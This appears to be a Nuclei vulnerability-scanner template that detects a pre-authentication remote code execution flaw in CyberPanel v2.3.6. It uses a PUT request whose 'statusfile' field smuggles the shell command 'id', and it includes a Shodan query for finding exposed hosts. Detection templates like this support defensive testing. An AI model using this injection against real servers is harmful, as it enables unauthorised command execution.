flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: csrftoken
    part: header
    regex:
    - csrftoken=([A-Za-z0-9]+)
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - uid=
    - error_message
    - requestStatus
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  - 'PUT /dataBases/upgrademysqlstatus HTTP/1.1

    Host: {{Hostname}}

    X-CSRFToken: {{csrftoken}}

    Content-Type: application/json

    Referer: {{RootURL}}

    Cookie: csrftoken={{csrftoken}}


    {"statusfile":"/dev/null; id; #","csrftoken":"{{csrftoken}}"}

    '
id: cyberpanel-rce
info:
  author: DhiyaneshDK
  description: 'CyberPanel v2.3.6 has a critical vulnerability that allows remote
    attackers to execute arbitrary commands on the server without prior authentication.

    '
  impact: Attackers can exploit this vulnerability by crafting malicious requests
    that bypass authentication controls, allowing them to inject and execute arbitrary
    commands on the underlying server.
  metadata:
    max-request: 2
    shodan-query: html:"CyberPanel"
    verified: true
  name: CyberPanel v2.3.6 Pre-Auth Remote Code Execution
  reference:
  - https://community.cyberpanel.net/t/cyberpanel-2-1-remote-code-execution-rce/31760
  - https://dreyand.rs/code/review/2024/10/27/what-are-my-options-cyberpanel-v236-pre-auth-rce
  severity: critical
  tags: cyberpanel,rce,intrusive
